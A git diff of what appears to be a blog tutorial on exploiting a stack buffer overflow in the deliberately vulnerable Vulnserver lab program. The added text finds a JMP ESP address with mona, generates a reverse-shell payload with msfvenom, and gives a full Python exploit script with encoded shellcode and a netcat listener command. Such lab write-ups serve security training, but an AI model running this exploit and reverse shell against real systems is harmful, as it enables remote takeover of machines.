@@ -195,7 +195,6 @@ badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x1
 
 ```
 [Found from bulbsecurity.com](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
-
 Now we edit our python script to include the badchars, I also removed the **\x00** character. The code should look something like
 
 ```python
@@ -247,13 +246,145 @@ Finding module means that we need to find a usable module that would allow us to
 have memory potections enabled such as DEB, ASLR, SafeSEH etc. Now there are ways to bypass these but that is out-of-scope. We can do this by using
 the mona module we installed during the setup.
 
-In Immunity type !mona modules on the search bar and press enter
+In Immunity type **!mona modules** on the search bar and press enter
 
 ![exp10](/images/vulnserver/stack/exp10.PNG)
 
-Following window will appear. Here we are looking for a DLL that is attached to vulnserver, and we should see one named *essfunc.dll** that has all of the
+Following window will appear. Here we are looking for a DLL that is attached to vulnserver, and we should see one named **essfunc.dll** that has all of the
 memory protections set to **false**
 
 ![exp11](/images/vulnserver/stack/exp11.PNG)
 
+Now that we found our module, we need to figure out the jmp esp or jump pointer to ESP that tells the program to jump to the address
+stored in the ESP register and resume execution. This can be googled but we can again use metasploit-framework to do it for us using nasm_shell
+**/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb**
 
+![exp12](/images/vulnserver/stack/exp12.PNG)
+
+We now know the JMP ESP opcode equilevant is FFE4 in hexadecimal. Going back to Immunity we need to search for the JMP ESP instruction in the essc.dll module. This can be with the mona module
+by typing **!mona find -s "\xff\xe4" -m essfunc.dll**
+
+![exp13](/images/vulnserver/stack/exp13.PNG)
+
+The following window appears, we can see that there are total of 9 valid return addresses and they do not have ASLR enabled.
+
+![exp14](/images/vulnserver/stack/exp14.PNG)
+
+We cam now choose whichever return address we'd like, in this case 'Ill choose the **625011c7** address. Now we need to edit our python script
+by adding the address in it. The code should look something like 
+
+```python
+#!/usr/bin/python
+import sys, socket
+
+
+host = "192.168.209.133"
+port = 9999
+
+
+shellcode = "A" * 2003 + "\xc7\x11\x50\x62"
+
+while True:
+         try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((host,port))
+                s.send(('TRUN /.:/' + shellcode))
+                s.close()
+                     
+         except:
+                 print "Unable to connect to the server"
+                 sys.exit()
+```
+
+Take note how we added our return address to the script. Since we are attacking x86 architecture (32-bit) we need to add the
+address in litte endian format. Next going back to Immunity we need to add a software breakpoint which will stop the prgorma from executing and
+will wait for further instructions when it hits our return address of **625011c7**. To do click on the arrow highlighted in yellow.
+
+![exp15](/images/vulnserver/stack/exp15.PNG)
+
+New window opens up and input your chose retrun address, in this case it is **625011c7**
+
+![exp16](/images/vulnserver/stack/exp16.PNG)
+
+The chosen memory address should be chose and have JMP ESP next to it, then press F2 to set the breakpoint and the address should change color to light blue.
+
+![exp17](/images/vulnserver/stack/exp17.PNG)
+
+Next make sure Immunity is running and then execute the python script. Immunity should crash and EIP should point to the chosen address in this case **625011c7**
+
+![exp18](/images/vulnserver/stack/exp18.PNG)
+
+Now that we know we control the EIP, we can generate a reverse shell.
+
+### Reverse shell
+
+Using msfvenom we can create a reverse shell. Using the command
+** msfvenom -p windows/meterpreter/reverse_tcp lhost=kali ip lport= kali port exitfunc=thread -f c -a x86 -b "\x00"**
+where
+* -p means payload we want to use
+* lhost - kali ip address
+* lport - kali port to listen on
+* exitfunc=thread - makes the exploit more reliable
+* -f c - filetype for the exploit, in this case it is c
+* -a x86 - specifies the architecture
+* -b - bad characters 
+
+![exp19](/images/vulnserver/stack/exp19.PNG)
+
+Next we add our shellcode to the python script. Note we also add 30 "\x90" or NOPs which stands for NO OPERATION and are basically just padding. The code should look something like
+
+```python
+#!/usr/bin/python
+import sys, socket
+
+
+host = "192.168.209.133"
+port = 9999
+
+# msfvenom -p windows/shell_reverse_tcp lhost=192.168.209.131 lport=9001 exitfunc=thread -f c -a x86 -b "\x00" 
+
+overflow = ("\xbf\x1c\x70\x43\x21\xd9\xcd\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
+"\x52\x83\xeb\xfc\x31\x7b\x0e\x03\x67\x7e\xa1\xd4\x6b\x96\xa7"
+"\x17\x93\x67\xc8\x9e\x76\x56\xc8\xc5\xf3\xc9\xf8\x8e\x51\xe6"
+"\x73\xc2\x41\x7d\xf1\xcb\x66\x36\xbc\x2d\x49\xc7\xed\x0e\xc8"
+"\x4b\xec\x42\x2a\x75\x3f\x97\x2b\xb2\x22\x5a\x79\x6b\x28\xc9"
+"\x6d\x18\x64\xd2\x06\x52\x68\x52\xfb\x23\x8b\x73\xaa\x38\xd2"
+"\x53\x4d\xec\x6e\xda\x55\xf1\x4b\x94\xee\xc1\x20\x27\x26\x18"
+"\xc8\x84\x07\x94\x3b\xd4\x40\x13\xa4\xa3\xb8\x67\x59\xb4\x7f"
+"\x15\x85\x31\x9b\xbd\x4e\xe1\x47\x3f\x82\x74\x0c\x33\x6f\xf2"
+"\x4a\x50\x6e\xd7\xe1\x6c\xfb\xd6\x25\xe5\xbf\xfc\xe1\xad\x64"
+"\x9c\xb0\x0b\xca\xa1\xa2\xf3\xb3\x07\xa9\x1e\xa7\x35\xf0\x76"
+"\x04\x74\x0a\x87\x02\x0f\x79\xb5\x8d\xbb\x15\xf5\x46\x62\xe2"
+"\xfa\x7c\xd2\x7c\x05\x7f\x23\x55\xc2\x2b\x73\xcd\xe3\x53\x18"
+"\x0d\x0b\x86\x8f\x5d\xa3\x79\x70\x0d\x03\x2a\x18\x47\x8c\x15"
+"\x38\x68\x46\x3e\xd3\x93\x01\x81\x8c\x4a\x52\x69\xcf\x6c\x76"
+"\x43\x46\x8a\x12\x83\x0e\x05\x8b\x3a\x0b\xdd\x2a\xc2\x81\x98"
+"\x6d\x48\x26\x5d\x23\xb9\x43\x4d\xd4\x49\x1e\x2f\x73\x55\xb4"
+"\x47\x1f\xc4\x53\x97\x56\xf5\xcb\xc0\x3f\xcb\x05\x84\xad\x72"
+"\xbc\xba\x2f\xe2\x87\x7e\xf4\xd7\x06\x7f\x79\x63\x2d\x6f\x47"
+"\x6c\x69\xdb\x17\x3b\x27\xb5\xd1\x95\x89\x6f\x88\x4a\x40\xe7"
+"\x4d\xa1\x53\x71\x52\xec\x25\x9d\xe3\x59\x70\xa2\xcc\x0d\x74"
+"\xdb\x30\xae\x7b\x36\xf1\xce\x99\x92\x0c\x67\x04\x77\xad\xea"
+"\xb7\xa2\xf2\x12\x34\x46\x8b\xe0\x24\x23\x8e\xad\xe2\xd8\xe2"
+"\xbe\x86\xde\x51\xbe\x82")
+
+
+shellcode = "A" * 2003 + "\xc7\x11\x50\x62" + "\x90" * 30 + overflow
+
+while True:
+         try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((host,port))
+                s.send(('TRUN /.:/' + shellcode))
+                s.close()
+                     
+         except:
+                 print "Unable to connect to the server"
+                 sys.exit()
+        
+```
+
+After modifying the script, create netcat listener with the command *nc -lvnp 9001* and start vulnserver again and finally run the exploit.
+Everything done correctly we will get a revese shell.
+
+![exp20](/images/vulnserver/stack/exp20.PNG)
